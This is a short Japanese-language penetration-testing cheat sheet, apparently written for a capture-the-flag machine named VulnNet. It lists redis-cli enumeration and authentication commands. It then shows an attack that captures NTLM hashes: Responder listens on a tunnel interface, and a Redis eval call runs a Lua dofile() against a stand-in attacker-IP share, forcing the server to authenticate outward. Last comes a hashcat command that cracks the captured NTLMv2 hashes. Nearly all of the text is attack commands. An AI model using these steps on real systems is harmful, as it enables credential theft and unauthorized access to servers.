# redis-cli

```sh
redis-cli -h VULNNET.local -p 6379
```

```sh

info

keys *

scan 0

get <key>

config get *

config get requirepass

auth <password>
```

## responder でNTLMハッシュをキャプチャ

```sh
sudo responder -I tun0
```

```sh
eval "dofile('//<attacker-ip>/noexist')" 0
```

NTLMv2-SSP ハッシュのクラック

```shell
hashcat -m 5600 <hash file> <password file> --force
```
